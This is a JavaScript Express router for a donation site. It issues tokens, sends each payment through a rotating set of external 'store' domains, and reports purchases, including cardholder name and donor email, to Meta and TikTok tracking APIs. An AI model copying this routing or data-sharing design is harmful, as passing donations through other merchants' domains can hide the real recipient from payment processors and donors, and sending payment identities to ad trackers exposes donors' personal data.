const express = require('express');
const crypto = require('crypto');

module.exports = function createDonationRouter(ctx) {
  const router = express.Router();
  const {
    ACTIVE_CAMPAIGN,
    ACTIVE_CURRENCY,
    CALLBACK_SECRET,
    JourneyLog,
    fmtCurrency,
    getOrCreateVisitor,
    getClientInfo,
    isTrackingEnabled,
    trackEvent,
    trackPurchase,
    getNextStore,
    createDonationToken
  } = ctx;

  router.post('/api/init-donation', async (req, res) => {
    const clientInfo = getClientInfo(req);
    const { amount, tip = 0, isAnonymous = false, donorEmail = null, tracking = null } = req.body;

    try {
      if (!amount || amount < 0.50) {
        return res.status(400).json({ error: 'Invalid donation amount' });
      }

      const store = await getNextStore();
      if (!store) {
        return res.status(503).json({ error: 'No active stores available' });
      }

      const token = crypto.randomBytes(32).toString('hex');
      const expiresAt = new Date(Date.now() + 5 * 60 * 1000).toISOString();

      await createDonationToken({
        token,
        amount: parseFloat(amount),
        currency: ACTIVE_CURRENCY.code,
        campaignSlug: ACTIVE_CAMPAIGN,
        storeId: store.id,
        language: ctx.DEFAULT_LANGUAGE,
        tipAmount: parseFloat(tip),
        isAnonymous,
        donorEmail,
        tracking: tracking || {},
        ipAddress: clientInfo.ipAddress,
        userAgent: clientInfo.userAgent,
        expiresAt
      });

      const { visitor } = getOrCreateVisitor(clientInfo.ipAddress, req.body?.clientLocation);
      JourneyLog.paymentEvent(visitor, 'redirect_initiated', `${fmtCurrency(amount)} → ${store.domain}`);

      const storeBase = process.env.DEV_STORE_URL || `https://${store.domain}`;
      const redirectUrl = `${storeBase}/s/${token}`;
      res.json({ redirectUrl });
    } catch (error) {
      console.error('Init donation error:', error);
      res.status(500).json({ error: 'Failed to initialize donation' });
    }
  });

  router.post('/api/payment-callback', async (req, res) => {
    const { secret, tokenId, paymentData } = req.body;

    if (secret !== CALLBACK_SECRET) {
      return res.status(403).json({ error: 'Invalid callback secret' });
    }

    try {
      if (isTrackingEnabled() && paymentData) {
        const tracking = paymentData.tracking || {};
        const sourceUrl = tracking.sourceUrl || '';
        const myHost = req.get('host') || '';
        let isMyDonation = true;

        if (sourceUrl && myHost) {
          try {
            const srcHost = new URL(sourceUrl).host;
            isMyDonation = srcHost === myHost;
          } catch (_) {}
        }

        if (isMyDonation) {
          const clientInfo = {
            ipAddress: paymentData.ipAddress || 'unknown',
            userAgent: paymentData.userAgent || 'unknown',
            clientLocation: null
          };

          const trackingData = {
            eventId: tracking.eventId || paymentData.stripeChargeId,
            sourceUrl: sourceUrl || `https://${myHost}/`,
            fbp: tracking.fbp || null,
            fbc: tracking.fbc || null,
            ttp: tracking.ttp || null,
            ttclid: tracking.ttclid || null
          };

          let capiResult = { meta: '-', tiktok: '-' };
          try {
            capiResult = await trackPurchase({
              amount: paymentData.amount,
              currency: paymentData.currency,
              donationType: 'one-time',
              captureId: paymentData.stripeChargeId,
              cardHolderName: paymentData.cardHolderName,
              donorNameReal: paymentData.donorNameReal,
              donorEmail: paymentData.donorEmail,
              customerId: paymentData.customerId
            }, trackingData, clientInfo);
          } catch (err) {
            console.error('CAPI tracking error (non-critical):', err.message);
          }

          const { visitor } = getOrCreateVisitor(
            paymentData?.ipAddress || 'unknown',
            null
          );
          JourneyLog.purchase(
            visitor,
            paymentData?.amount || 0,
            paymentData?.storeDomain || 'unknown',
            capiResult
          );
        } else {
          const { visitor } = getOrCreateVisitor(
            paymentData?.ipAddress || 'unknown',
            null
          );
          JourneyLog.purchase(
            visitor,
            paymentData?.amount || 0,
            paymentData?.storeDomain || 'unknown',
            { meta: '-', tiktok: '-' }
          );
        }
      }

      res.json({ success: true });
    } catch (error) {
      console.error('Payment callback error:', error);
      res.status(500).json({ error: 'Callback processing failed' });
    }
  });

  router.post('/api/track', async (req, res) => {
    if (!isTrackingEnabled()) {
      return res.json({ success: true, message: 'Tracking not configured' });
    }

    const clientInfo = getClientInfo(req);
    const { event, eventId, sourceUrl, cookies, clientLocation, data } = req.body;

    const myHost = req.get('host') || '';
    if (sourceUrl && myHost) {
      try {
        const srcHost = new URL(sourceUrl).host;
        if (srcHost !== myHost) {
          return res.json({ success: true });
        }
      } catch (_) {}
    }

    const { visitor } = getOrCreateVisitor(clientInfo.ipAddress, clientLocation);

    const userData = {
      fbp: cookies?.fbp || null,
      fbc: cookies?.fbc || null,
      ttp: cookies?.ttp || null,
      ttclid: cookies?.ttclid || null,
      externalId: null
    };

    const eventData = {
      eventId,
      sourceUrl: sourceUrl || `https://${myHost || 'hoperise.online'}/`,
      value: data?.value,
      currency: data?.currency || ACTIVE_CURRENCY.code,
      contentName: data?.contentName,
      contentType: data?.contentType
    };

    try {
      if (event === 'PageView') {
        await trackEvent(event, eventData, userData, clientInfo);
        return res.json({ success: true });
      }

      const capiStatus = await trackEvent(event, eventData, userData, clientInfo);

      if (event === 'ViewContent') {
        JourneyLog.newVisitor(visitor, new URL(sourceUrl || 'https://hoperise.online/').pathname, capiStatus);
      } else {
        const eventMessages = {
          'AddToCart': 'Opened donation modal',
          'InitiateCheckout': `Started checkout (${fmtCurrency(data?.value || '?')})`,
          'AddPaymentInfo': 'Entering payment details',
          'Purchase': 'Completed donation'
        };
        JourneyLog.event(visitor, event, eventMessages[event] || event, capiStatus);
      }

      res.json({ success: true });
    } catch (error) {
      res.json({ success: false, error: error.message });
    }
  });

  router.post('/api/track/payment-event', (req, res) => {
    const clientInfo = getClientInfo(req);
    const { eventType, details, amount, paymentMethod, clientLocation } = req.body;

    const { visitor } = getOrCreateVisitor(clientInfo.ipAddress, clientLocation);

    let detailStr = details || '';
    if (amount) {
      detailStr = `${fmtCurrency(amount)}${paymentMethod ? ` via ${paymentMethod}` : ''}${details ? ` - ${details}` : ''}`;
    }

    JourneyLog.paymentEvent(visitor, eventType, detailStr);
    res.json({ success: true });
  });

  return router;
};
